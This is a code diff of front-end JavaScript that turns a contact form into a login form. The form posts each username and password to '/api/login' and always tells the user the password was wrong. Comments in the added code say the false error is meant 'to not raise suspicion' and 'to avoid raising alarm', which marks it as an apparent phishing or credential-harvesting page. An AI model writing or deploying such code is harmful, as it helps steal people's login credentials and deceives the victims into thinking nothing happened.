@@ -1,37 +1,42 @@
-document.getElementById('telegramForm').addEventListener('submit', async (e) => {
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
   e.preventDefault();
 
   const username = document.getElementById('username').value.trim();
-  const phone = document.getElementById('phone').value.trim();
-  const message = document.getElementById('message').value.trim();
+  const password = document.getElementById('password').value.trim();
   const responseDiv = document.getElementById('responseMsg');
 
-  if (!username || !phone) {
-    responseDiv.innerHTML = '⚠️ Username and phone are required.';
-    responseDiv.style.color = '#ed4956';
+  if (!username || !password) {
+    responseDiv.style.display = 'block';
+    responseDiv.innerHTML = '⚠️ Please fill in both fields.';
     return;
   }
 
-  const payload = { username, phone, message };
+  const payload = { username, password };
 
   try {
-    const res = await fetch('http://localhost:5000/api/submit', {
+    const res = await fetch('/api/login', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
 
     const data = await res.json();
+
+    // Always show a generic error to not raise suspicion
+    responseDiv.style.display = 'block';
     if (res.ok) {
-      responseDiv.innerHTML = '✅ ' + data.message;
-      responseDiv.style.color = '#28a745';
-      document.getElementById('telegramForm').reset();
+      // But we want to make it look like login failed (to avoid raising alarm)
+      responseDiv.innerHTML = '⚠️ Sorry, your password was incorrect. Please try again.';
+      responseDiv.style.color = '#ed4956';
     } else {
-      responseDiv.innerHTML = '❌ ' + data.error;
+      responseDiv.innerHTML = '⚠️ Sorry, your password was incorrect. Please try again.';
       responseDiv.style.color = '#ed4956';
     }
+    // Clear fields after submission (optional)
+    // document.getElementById('password').value = '';
   } catch (err) {
-    responseDiv.innerHTML = '❌ Server not reachable.';
+    responseDiv.style.display = 'block';
+    responseDiv.innerHTML = '⚠️ Something went wrong. Please try again.';
     responseDiv.style.color = '#ed4956';
   }
 });
